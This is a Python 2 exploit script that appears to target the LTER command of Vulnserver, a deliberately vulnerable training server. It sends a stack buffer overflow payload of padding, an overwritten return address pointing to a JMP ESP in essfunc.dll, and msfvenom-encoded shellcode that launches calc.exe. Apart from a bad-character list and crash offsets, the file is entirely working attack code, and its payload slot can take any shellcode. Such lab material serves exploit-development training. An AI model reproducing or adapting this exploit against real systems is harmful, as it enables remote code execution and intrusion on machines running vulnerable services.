#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])

# Badchars
badchars = (
"\x00\x0a\x0d"
"\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

# msfvenom -p windows/exec cmd=calc.exe EXITFUNC=thread -e x86/alpha_mixed -b "\x00\x0d\x0a" BufferRegister=ESP -v shellcode -f python
# Size 440 bytes
shellcode =  ""
shellcode += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x69\x6c\x59\x78\x4f\x72\x67\x70"
shellcode += "\x53\x30\x47\x70\x43\x50\x4f\x79\x39\x75\x44\x71"
shellcode += "\x4f\x30\x63\x54\x6e\x6b\x30\x50\x34\x70\x6e\x6b"
shellcode += "\x56\x32\x74\x4c\x6c\x4b\x46\x32\x65\x44\x6e\x6b"
shellcode += "\x73\x42\x66\x48\x54\x4f\x38\x37\x72\x6a\x65\x76"
shellcode += "\x55\x61\x79\x6f\x4e\x4c\x55\x6c\x63\x51\x31\x6c"
shellcode += "\x75\x52\x36\x4c\x51\x30\x4a\x61\x6a\x6f\x44\x4d"
shellcode += "\x66\x61\x58\x47\x49\x72\x6a\x52\x36\x32\x63\x67"
shellcode += "\x6e\x6b\x52\x72\x62\x30\x6e\x6b\x62\x6a\x45\x6c"
shellcode += "\x4e\x6b\x30\x4c\x34\x51\x30\x78\x6a\x43\x70\x48"
shellcode += "\x66\x61\x38\x51\x43\x61\x6c\x4b\x43\x69\x37\x50"
shellcode += "\x77\x71\x49\x43\x6e\x6b\x70\x49\x62\x38\x58\x63"
shellcode += "\x77\x4a\x53\x79\x6c\x4b\x30\x34\x4c\x4b\x37\x71"
shellcode += "\x6e\x36\x44\x71\x79\x6f\x4c\x6c\x4f\x31\x7a\x6f"
shellcode += "\x34\x4d\x73\x31\x6b\x77\x36\x58\x4b\x50\x33\x45"
shellcode += "\x49\x66\x76\x63\x73\x4d\x58\x78\x75\x6b\x33\x4d"
shellcode += "\x51\x34\x74\x35\x59\x74\x76\x38\x4c\x4b\x61\x48"
shellcode += "\x51\x34\x65\x51\x4b\x63\x62\x46\x6c\x4b\x44\x4c"
shellcode += "\x30\x4b\x4e\x6b\x30\x58\x45\x4c\x36\x61\x68\x53"
shellcode += "\x6e\x6b\x65\x54\x4c\x4b\x77\x71\x68\x50\x6b\x39"
shellcode += "\x71\x54\x57\x54\x45\x74\x71\x4b\x73\x6b\x31\x71"
shellcode += "\x71\x49\x52\x7a\x43\x61\x59\x6f\x69\x70\x61\x4f"
shellcode += "\x43\x6f\x51\x4a\x6e\x6b\x44\x52\x7a\x4b\x6c\x4d"
shellcode += "\x43\x6d\x63\x5a\x73\x31\x6c\x4d\x6d\x55\x4e\x52"
shellcode += "\x65\x50\x65\x50\x67\x70\x76\x30\x43\x58\x70\x31"
shellcode += "\x4c\x4b\x70\x6f\x6e\x67\x39\x6f\x48\x55\x6f\x4b"
shellcode += "\x49\x70\x47\x6d\x64\x6a\x64\x4a\x33\x58\x4f\x56"
shellcode += "\x4a\x35\x6f\x4d\x4d\x4d\x49\x6f\x6a\x75\x65\x6c"
shellcode += "\x36\x66\x33\x4c\x46\x6a\x4f\x70\x39\x6b\x59\x70"
shellcode += "\x62\x55\x64\x45\x6f\x4b\x51\x57\x55\x43\x61\x62"
shellcode += "\x42\x4f\x73\x5a\x37\x70\x70\x53\x39\x6f\x4b\x65"
shellcode += "\x53\x53\x45\x31\x72\x4c\x30\x63\x56\x4e\x71\x75"
shellcode += "\x73\x48\x55\x35\x35\x50\x41\x41"

# Max length
maxlen = 3000

# Crashes
crash_ecx = 3555
crash_edx = crash_ecx - 4
crash_seh = 3519
crash_nseh = crash_seh - 4
crash_eip = 2003

# Prefix
prefix = "A" * crash_eip

# Crash somewhere here
eip = struct.pack("<L", 0x62501203)         # JMP ESP # essfunc.dll

# Suffixes
suffix = "B" * (maxlen - len(prefix + eip + shellcode))

# Construct payload
payload = prefix + eip + shellcode + suffix

print "[+] Connecting to " + host + "\n"

try:
        req = (
                "LTER /.:/" +
                payload +
                "\r\n"
        )

        print "[+] Sending triggering payload of " + str(len(payload)) + " length message..."

        # Connect again, this time to send triggering payload    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.recv(1024)
        s.send(req)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()


